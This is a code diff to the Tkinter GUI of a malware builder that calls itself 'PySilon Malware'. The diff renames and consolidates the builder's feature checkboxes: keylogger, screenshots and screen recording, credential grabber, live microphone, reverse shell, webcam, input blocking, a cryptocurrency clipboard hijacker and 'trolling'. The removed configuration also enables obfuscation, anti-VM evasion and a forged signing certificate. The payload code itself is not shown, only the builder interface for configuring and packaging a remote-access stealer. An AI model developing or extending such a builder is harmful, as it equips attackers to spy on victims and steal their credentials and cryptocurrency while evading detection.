@@ -6,6 +6,7 @@ import os
 import pyperclip
 import time
 import sys
+import shutil
 import ctypes
 import json
 import tkinter.font as tkFont
@@ -39,108 +40,9 @@ class Builder:
             height=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['geometry']['height'])
         self.current_window = 0
 
-        self.malware_configuration = {
-            'token': '',
-            'guild_ids': '',
-            'registry_name': '',
-            'directory_name': '',
-            'executable_name': '',
-            'implode_secret': '',
-            'icon_path': 'resources/icons/default_icon.ico',
-            'functionalities': {
-                'keylogr': True,
-                'scrnsht': True,
-                'f_manag': True,
-                'grabber': True,
-                'mc_live': True,
-                'mc_recc': True,
-                'process': True,
-                'rev_shl': True,
-                'webcam_': True,
-                'scrnrec': True,
-                'inputbl': True,
-                'bluesod': True,
-                'crclipr': True,
-                'messger': True,
-                'txtspee': True,
-                'audctrl': True,
-                'monctrl': True,
-                'webbloc': True,
-                'jmpscar': True,
-                'keystrk': True,
-                'scrnman': True
-            },
-            'obfuscation': {
-                'enabled': True,
-                'settings': {
-                    'logicTransformer': True,
-                    'removeTypeHints': True,
-                    'fstrToFormatSeq': True,
-                    'encodeStrings': [
-                        True, 
-                        'chararray'  # mode (default: chararray) 
-                    ],
-                    'stringCollector': [
-                        True, 
-                        729,  # sample_size (default: 729)
-                        512  # max_samples
-                    ],
-                    'floatsToComplex': False,
-                    'intObfuscator': [
-                        True, 
-                        'bits'  # mode
-                    ],
-                    'renamer': [
-                        True,
-                        "f'{kind}{get_counter(kind)}'"  # rename_format (default: f'{kind}{get_counter(kind)})
-                    ],
-                    'typeAliasTransformer': [
-                        True, 
-                        ["str", "int", "float", "filter", "bool", "bytes", "map"]  # classes_to_alias
-                    ],
-                    'replaceAttribSet': True,
-                    'varCollector': False, # only for Python 3.11
-                    'unicodeTransformer': True
-                }
-            },
-            'anti_vm': {
-                'enabled': True,
-                'FilesCheck': True,
-                'ProcessesCheck': True,
-                'HardwareIDsCheck': True,
-                'MacAddressesCheck': True
-            },
-            'digital_certificate': {
-                'enabled': True,
-                'email_address': 'contact@pysilon.net',
-                'producer_name': 'PySilon Malware',
-                'country_name': 'NT',
-                'locality_name': '',
-                'state_or_province_name': '',
-                'organization_name': '',
-                'organization_unit_name': '',
-                'serial_number': 0,
-                'validity_start_in_seconds': 0,
-                'validity_end_in_seconds': 60*60*24*365
-            },
-            'debug_mode': False,
-            'crypto_clipper': {
-                'BTC': '',
-                'ETH': '',
-                'DOGE': '',
-                'LTC': '',
-                'XMR': '',
-                'BCH': '',
-                'DASH': '',
-                'TRX': '',
-                'XRP': '',
-                'XLM': ''
-            }
-        }
-
-        if 'configuration.tmp' not in os.listdir('resources/assets'):
+        if 'configuration.json' not in os.listdir('resources/cfg'):
             with open('resources/cfg/configuration.json', 'w', encoding='utf-8') as configuration_file:
-                configuration_file.write(json.dumps(self.malware_configuration, indent=4))
+                shutil.copy('resources/cfg/default_configuration.json', 'resources/cfg/configuration.json')
 
         self.general_settings()
 
@@ -508,27 +410,20 @@ class Builder:
                 self.malware_configuration['implode_secret'] = self.implode_entry.get()
             case 2:
                 self.malware_configuration['functionalities'] = {
-                    'keylogr': self.cbvar_keylogr.get(),
-                    'scrnsht': self.cbvar_scrnsht.get(),
+                    'keyctrl': self.cbvar_keyctrl.get(),
+                    'scrnget': self.cbvar_scrnget.get(),
                     'f_manag': self.cbvar_fmanag.get(),
                     'grabber': self.cbvar_grabber.get(),
-                    'mc_live': self.cbvar_mclive.get(),
-                    'mc_recc': self.cbvar_mcrecc.get(),
+                    'micgrab': self.cbvar_micgrab.get(),
                     'process': self.cbvar_process.get(),
                     'rev_shl': self.cbvar_revshl.get(),
                     'webcam_': self.cbvar_webcam.get(),
-                    'scrnrec': self.cbvar_scrnrec.get(),
                     'inputbl': self.cbvar_inputbl.get(),
-                    'bluesod': self.cbvar_bluesod.get(),
                     'crclipr': self.cbvar_crclipr.get(),
-                    'messger': self.cbvar_messger.get(),
-                    'txtspee': self.cbvar_txtspee.get(),
+                    'commtor': self.cbvar_communicator.get(),
                     'audctrl': self.cbvar_audctrl.get(),
                     'monctrl': self.cbvar_monctrl.get(),
-                    'webbloc': self.cbvar_webbloc.get(),
-                    'jmpscar': self.cbvar_jmpscar.get(),
-                    'keystrk': self.cbvar_keystrk.get(),
-                    'scrnman': self.cbvar_scrnman.get()
+                    'trollin': self.cbvar_troll.get(),
                 }
             case 3:
                 self.malware_configuration['obfuscation']['enabled'] = self.cbvar_obfuscation.get()
@@ -894,37 +789,37 @@ class Builder:
 
         x_start, y_start, x_delta, y_delta = builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkboxes']['x_start'], builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkboxes']['y_start'], builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkboxes']['x_delta'], builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['checkboxes']['y_delta']
 
-        self.cbvar_keylogr = tk.BooleanVar(value=True)
-        self.cb_keylogr = tk.Checkbutton(
+        self.cbvar_keyctrl = tk.BooleanVar(value=True)
+        self.cb_keyctrl = tk.Checkbutton(
             self.canvas,
             selectcolor='#0A0A10',
-            text='keylogger',
+            text='keylogger and controller',
             font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
-            variable=self.cbvar_keylogr,
+            variable=self.cbvar_keyctrl,
             
             onvalue=True,
             offvalue=False
         )
-        self.cb_keylogr.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['keylogr']))
-        self.cb_keylogr.bind("<Leave>", self.hide_tooltip)
-        self.cbvar_keylogr.set(self.malware_configuration['functionalities']['keylogr'])
-        self.canvas.create_window(x_start, y_start+y_delta*0, window=self.cb_keylogr, anchor='w')
+        self.cb_keyctrl.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['keylogr']))
+        self.cb_keyctrl.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_keyctrl.set(self.malware_configuration['functionalities']['keyctrl'])
+        self.canvas.create_window(x_start, y_start+y_delta*0, window=self.cb_keyctrl, anchor='w')
 
-        self.cbvar_scrnsht = tk.BooleanVar(value=True)
-        self.cb_scrnsht = tk.Checkbutton(
+        self.cbvar_scrnget = tk.BooleanVar(value=True)
+        self.cb_scrnget = tk.Checkbutton(
             self.canvas,
             selectcolor='#0A0A10',
-            text='take screenshots',
+            text='screenshots and screen recording',
             font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
-            variable=self.cbvar_scrnsht,
+            variable=self.cbvar_scrnget,
             
             onvalue=True,
             offvalue=False
         )
-        self.cb_scrnsht.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['scrnsht']))
-        self.cb_scrnsht.bind("<Leave>", self.hide_tooltip)
-        self.cbvar_scrnsht.set(self.malware_configuration['functionalities']['scrnsht'])
-        self.canvas.create_window(x_start, y_start+y_delta*1, window=self.cb_scrnsht, anchor='w')
+        self.cb_scrnget.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['scrnsht']))
+        self.cb_scrnget.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_scrnget.set(self.malware_configuration['functionalities']['scrnget'])
+        self.canvas.create_window(x_start, y_start+y_delta*1, window=self.cb_scrnget, anchor='w')
 
         self.cbvar_fmanag = tk.BooleanVar(value=True)
         self.cb_fmanag = tk.Checkbutton(
@@ -958,43 +853,27 @@ class Builder:
         self.cbvar_grabber.set(self.malware_configuration['functionalities']['grabber'])
         self.canvas.create_window(x_start, y_start+y_delta*3, window=self.cb_grabber, anchor='w')
 
-        self.cbvar_mclive = tk.BooleanVar(value=True)
-        self.cb_mclive = tk.Checkbutton(
+        self.cbvar_micgrab = tk.BooleanVar(value=True)
+        self.cb_micgrab = tk.Checkbutton(
             self.canvas,
             selectcolor='#0A0A10',
-            text='stream live microphone',
+            text='live microphone and recording',
             font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
-            variable=self.cbvar_mclive,
+            variable=self.cbvar_micgrab,
             
             onvalue=True,
             offvalue=False
         )
-        self.cb_mclive.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['mc_live']))
-        self.cb_mclive.bind("<Leave>", self.hide_tooltip)
-        self.cbvar_mclive.set(self.malware_configuration['functionalities']['mc_live'])
-        self.canvas.create_window(x_start, y_start+y_delta*4, window=self.cb_mclive, anchor='w')
-
-        self.cbvar_mcrecc = tk.BooleanVar(value=True)
-        self.cb_mcrecc = tk.Checkbutton(
-            self.canvas,
-            selectcolor='#0A0A10',
-            text='24/7 microphone recording',
-            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
-            variable=self.cbvar_mcrecc,
-            
-            onvalue=True,
-            offvalue=False
-        )
-        self.cb_mcrecc.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['mc_recc']))
-        self.cb_mcrecc.bind("<Leave>", self.hide_tooltip)
-        self.cbvar_mcrecc.set(self.malware_configuration['functionalities']['mc_recc'])
-        self.canvas.create_window(x_start, y_start+y_delta*5, window=self.cb_mcrecc, anchor='w')
+        self.cb_micgrab.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['mc_live']))
+        self.cb_micgrab.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_micgrab.set(self.malware_configuration['functionalities']['micgrab'])
+        self.canvas.create_window(x_start, y_start+y_delta*4, window=self.cb_micgrab, anchor='w')
 
         self.cbvar_process = tk.BooleanVar(value=True)
         self.cb_process = tk.Checkbutton(
             self.canvas,
             selectcolor='#0A0A10',
-            text='manage processes',
+            text='process manager',
             font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
             variable=self.cbvar_process,
             
@@ -1004,7 +883,7 @@ class Builder:
         self.cb_process.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['process']))
         self.cb_process.bind("<Leave>", self.hide_tooltip)
         self.cbvar_process.set(self.malware_configuration['functionalities']['process'])
-        self.canvas.create_window(x_start, y_start+y_delta*6, window=self.cb_process, anchor='w')
+        self.canvas.create_window(x_start, y_start+y_delta*5, window=self.cb_process, anchor='w')
 
         self.cbvar_revshl = tk.BooleanVar(value=True)
         self.cb_revshl = tk.Checkbutton(
@@ -1020,7 +899,7 @@ class Builder:
         self.cb_revshl.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['rev_shl']))
         self.cb_revshl.bind("<Leave>", self.hide_tooltip)
         self.cbvar_revshl.set(self.malware_configuration['functionalities']['rev_shl'])
-        self.canvas.create_window(x_start, y_start+y_delta*7, window=self.cb_revshl, anchor='w')
+        self.canvas.create_window(x_start, y_start+y_delta*6, window=self.cb_revshl, anchor='w')
         
         self.cbvar_webcam = tk.BooleanVar(value=True)
         self.cb_webcam = tk.Checkbutton(
@@ -1036,23 +915,7 @@ class Builder:
         self.cb_webcam.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['webcam_']))
         self.cb_webcam.bind("<Leave>", self.hide_tooltip)
         self.cbvar_webcam.set(self.malware_configuration['functionalities']['webcam_'])
-        self.canvas.create_window(x_start, y_start+y_delta*8, window=self.cb_webcam, anchor='w')
-
-        self.cbvar_scrnrec = tk.BooleanVar(value=True)
-        self.cb_scrnrec = tk.Checkbutton(
-            self.canvas,
-            selectcolor='#0A0A10',
-            text='screen recording',
-            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
-            variable=self.cbvar_scrnrec,
-            
-            onvalue=True,
-            offvalue=False
-        )
-        self.cb_scrnrec.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['scrnrec']))
-        self.cb_scrnrec.bind("<Leave>", self.hide_tooltip)
-        self.cbvar_scrnrec.set(self.malware_configuration['functionalities']['scrnrec'])
-        self.canvas.create_window(x_start, y_start+y_delta*9, window=self.cb_scrnrec, anchor='w')
+        self.canvas.create_window(x_start, y_start+y_delta*7, window=self.cb_webcam, anchor='w')
 
         self.cbvar_inputbl = tk.BooleanVar(value=True)
         self.cb_inputbl = tk.Checkbutton(
@@ -1068,7 +931,7 @@ class Builder:
         self.cb_inputbl.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['inputbl']))
         self.cb_inputbl.bind("<Leave>", self.hide_tooltip)
         self.cbvar_inputbl.set(self.malware_configuration['functionalities']['inputbl'])
-        self.canvas.create_window(x_start, y_start+y_delta*10, window=self.cb_inputbl, anchor='w')
+        self.canvas.create_window(x_start, y_start+y_delta*8, window=self.cb_inputbl, anchor='w')
 
         self.cbvar_crclipr = tk.BooleanVar(value=True)
         self.cb_crclipr = tk.Checkbutton(
@@ -1084,39 +947,23 @@ class Builder:
         self.cb_crclipr.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['crclipr']))
         self.cb_crclipr.bind("<Leave>", self.hide_tooltip)
         self.cbvar_crclipr.set(self.malware_configuration['functionalities']['crclipr'])
-        self.canvas.create_window(x_start*x_delta, y_start+y_delta*0, window=self.cb_crclipr, anchor='w')
+        self.canvas.create_window(x_start, y_start+y_delta*9, window=self.cb_crclipr, anchor='w')
 
-        self.cbvar_messger = tk.BooleanVar(value=True)
-        self.cb_messger = tk.Checkbutton(
+        self.cbvar_communicator = tk.BooleanVar(value=True)
+        self.cb_communicator = tk.Checkbutton(
             self.canvas,
             selectcolor='#0A0A10',
-            text='messager',
+            text='communicator',
             font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
-            variable=self.cbvar_messger,
+            variable=self.cbvar_communicator,
             
             onvalue=True,
             offvalue=False
         )
-        self.cb_messger.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['messger']))
-        self.cb_messger.bind("<Leave>", self.hide_tooltip)
-        self.cbvar_messger.set(self.malware_configuration['functionalities']['messger'])
-        self.canvas.create_window(x_start*x_delta, y_start+y_delta*1, window=self.cb_messger, anchor='w')
-
-        self.cbvar_txtspee = tk.BooleanVar(value=True)
-        self.cb_txtspee = tk.Checkbutton(
-            self.canvas,
-            selectcolor='#0A0A10',
-            text='Text-to-Speech',
-            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
-            variable=self.cbvar_txtspee,
-            
-            onvalue=True,
-            offvalue=False
-        )
-        self.cb_txtspee.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['txtspee']))
-        self.cb_txtspee.bind("<Leave>", self.hide_tooltip)
-        self.cbvar_txtspee.set(self.malware_configuration['functionalities']['txtspee'])
-        self.canvas.create_window(x_start*x_delta, y_start+y_delta*2, window=self.cb_txtspee, anchor='w')
+        self.cb_communicator.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['messger']))
+        self.cb_communicator.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_communicator.set(self.malware_configuration['functionalities']['commtor'])
+        self.canvas.create_window(x_start, y_start+y_delta*10, window=self.cb_communicator, anchor='w')
 
         self.cbvar_audctrl = tk.BooleanVar(value=True)
         self.cb_audctrl = tk.Checkbutton(
@@ -1132,7 +979,7 @@ class Builder:
         self.cb_audctrl.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['audctrl']))
         self.cb_audctrl.bind("<Leave>", self.hide_tooltip)
         self.cbvar_audctrl.set(self.malware_configuration['functionalities']['audctrl'])
-        self.canvas.create_window(x_start*x_delta, y_start+y_delta*3, window=self.cb_audctrl, anchor='w')
+        self.canvas.create_window(x_start*x_delta, y_start+y_delta*0, window=self.cb_audctrl, anchor='w')
 
         self.cbvar_monctrl = tk.BooleanVar(value=True)
         self.cb_monctrl = tk.Checkbutton(
@@ -1148,87 +995,23 @@ class Builder:
         self.cb_monctrl.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['monctrl']))
         self.cb_monctrl.bind("<Leave>", self.hide_tooltip)
         self.cbvar_monctrl.set(self.malware_configuration['functionalities']['monctrl'])
-        self.canvas.create_window(x_start*x_delta, y_start+y_delta*4, window=self.cb_monctrl, anchor='w')
+        self.canvas.create_window(x_start*x_delta, y_start+y_delta*1, window=self.cb_monctrl, anchor='w')
 
-        self.cbvar_webbloc = tk.BooleanVar(value=True)
-        self.cb_webbloc = tk.Checkbutton(
+        self.cbvar_troll = tk.BooleanVar(value=True)
+        self.cb_troll = tk.Checkbutton(
             self.canvas,
             selectcolor='#0A0A10',
-            text='website blocking',
+            text='trolling',
             font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
-            variable=self.cbvar_webbloc,
+            variable=self.cbvar_troll,
             
             onvalue=True,
             offvalue=False
         )
-        self.cb_webbloc.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['webbloc']))
-        self.cb_webbloc.bind("<Leave>", self.hide_tooltip)
-        self.cbvar_webbloc.set(self.malware_configuration['functionalities']['webbloc'])
-        self.canvas.create_window(x_start*x_delta, y_start+y_delta*5, window=self.cb_webbloc, anchor='w')
-
-        self.cbvar_jmpscar = tk.BooleanVar(value=True)
-        self.cb_jmpscar = tk.Checkbutton(
-            self.canvas,
-            selectcolor='#0A0A10',
-            text='jumpscare',
-            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
-            variable=self.cbvar_jmpscar,
-            
-            onvalue=True,
-            offvalue=False
-        )
-        self.cb_jmpscar.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['jmpscar']))
-        self.cb_jmpscar.bind("<Leave>", self.hide_tooltip)
-        self.cbvar_jmpscar.set(self.malware_configuration['functionalities']['jmpscar'])
-        self.canvas.create_window(x_start*x_delta, y_start+y_delta*6, window=self.cb_jmpscar, anchor='w')
-
-        self.cbvar_keystrk = tk.BooleanVar(value=True)
-        self.cb_keystrk = tk.Checkbutton(
-            self.canvas,
-            selectcolor='#0A0A10',
-            text='keystroke type',
-            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
-            variable=self.cbvar_keystrk,
-            
-            onvalue=True,
-            offvalue=False
-        )
-        self.cb_keystrk.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['keystrk']))
-        self.cb_keystrk.bind("<Leave>", self.hide_tooltip)
-        self.cbvar_keystrk.set(self.malware_configuration['functionalities']['keystrk'])
-        self.canvas.create_window(x_start*x_delta, y_start+y_delta*7, window=self.cb_keystrk, anchor='w')
-
-        self.cbvar_scrnman = tk.BooleanVar(value=True)
-        self.cb_scrnman = tk.Checkbutton(
-            self.canvas,
-            selectcolor='#0A0A10',
-            text='screen manipulation',
-            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
-            variable=self.cbvar_scrnman,
-            
-            onvalue=True,
-            offvalue=False
-        )
-        self.cb_scrnman.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['scrnman']))
-        self.cb_scrnman.bind("<Leave>", self.hide_tooltip)
-        self.cbvar_scrnman.set(self.malware_configuration['functionalities']['scrnman'])
-        self.canvas.create_window(x_start*x_delta, y_start+y_delta*8, window=self.cb_scrnman, anchor='w')
-
-        self.cbvar_bluesod = tk.BooleanVar(value=True)
-        self.cb_bluesod = tk.Checkbutton(
-            self.canvas,
-            selectcolor='#0A0A10',
-            text='BSoD',
-            font=('Consolas', builder_configuration['window_sizes'][builder_configuration['use_sizes']]['functionality_settings']['font_size']),
-            variable=self.cbvar_bluesod,
-            
-            onvalue=True,
-            offvalue=False
-        )
-        self.cb_bluesod.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['bluesod']))
-        self.cb_bluesod.bind("<Leave>", self.hide_tooltip)
-        self.cbvar_bluesod.set(self.malware_configuration['functionalities']['bluesod'])
-        self.canvas.create_window(x_start*x_delta, y_start+y_delta*9, window=self.cb_bluesod, anchor='w')
+        self.cb_troll.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['jmpscar']))
+        self.cb_troll.bind("<Leave>", self.hide_tooltip)
+        self.cbvar_troll.set(self.malware_configuration['functionalities']['trollin'])
+        self.canvas.create_window(x_start*x_delta, y_start+y_delta*2, window=self.cb_troll, anchor='w')
 
     def compiling_settings(self):
         self.general_settings_button['state'] = tk.NORMAL
@@ -1459,7 +1242,6 @@ def main():
     root = tk.Tk()
     #root.geometry(str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['root_geometry']['width'])+'x'+str(builder_configuration['window_sizes'][builder_configuration['use_sizes']]['root_geometry']['height']))
     
-    
     root.wm_attributes('-transparentcolor', '#fe00ff')
     root.attributes("-topmost", True)
     root.overrideredirect(True)
@@ -1484,12 +1266,7 @@ def main():
         root.geometry(f'{size_x}x{size_y}+{sw-sizex}+{sh-sizey}')
         root.update()
 
-    
-    
-    
-    
     root.geometry(f'700x520+{sw-sizex}+{sh-sizey}')
-    
     
     root.mainloop()
 
